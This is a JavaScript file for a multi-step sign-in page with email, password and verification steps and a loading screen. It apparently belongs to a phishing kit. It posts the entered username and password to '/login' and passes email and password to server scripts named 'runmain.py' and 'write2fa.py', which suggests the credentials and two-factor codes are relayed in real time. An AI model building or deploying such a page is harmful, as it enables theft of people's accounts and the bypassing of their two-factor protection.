var nextBtn = document.querySelector(".sign-in-next-btn-submit");
var signInBtn = document.querySelector(".sign-in-btn-submit")

var verifyDiv = document.querySelector(".verification-form")

var passwordDiv = document.querySelector(".password-sign-in-form");
var emailDiv = document.querySelector(".email-sign-in-form");
var loadingDiv = document.querySelector(".loading-screen");
var superloadingDiv = document.querySelector(".loading-screen-div");



$(document).on('submit','#login-form',function(e)
                   {
      console.log('hello');
      e.preventDefault();
      $.ajax({
        type:'POST',
        url:'/login',
        data:{
          username:$("#username").val(),
          password:$("#password").val()
        },
        success:function()
        {
          // alert('saved');
          loadingDiv.style.display = "block";
          superloadingDiv.style.display = "block";
          passwordDiv.style.display = "none";
        }
      })
    });


//call python function

function postData(email, password) {
  $.ajax({
      type: "POST",
      url: "/runmain.py",
      data: { param: email,password },
      success: callbackFunc
  });
}
function callortext(email, password, isCall) {
  if (isCall == 1){
    $.ajax({
      type: "POST",
      url: "/write2fa.py",
      data: { param: email,password },
      success: callbackFunc
  });
  }

}


function callbackFunc(response) {
  // do something with the response
  console.log(response);
}
// postData("test")

nextBtn.addEventListener("click", function(event) {
    event.preventDefault(); 
    passwordDiv.style.display = "block";
    emailDiv.style.display = "none";
});

// signInBtn.addEventListener("click", function(event) {
//     event.preventDefault(); 
//     verifyDiv.style.display = "block";
//     passwordDiv.style.display = "none";
// });

let usernameValue = localStorage.getItem("username") || "";

function returnUsername() {
  usernameValue = document.getElementById("username").value;
  localStorage.setItem("username", usernameValue);
  document.getElementById("display-name").innerHTML = usernameValue;
  return usernameValue;
}

document.getElementById("username").addEventListener("keyup", returnUsername);







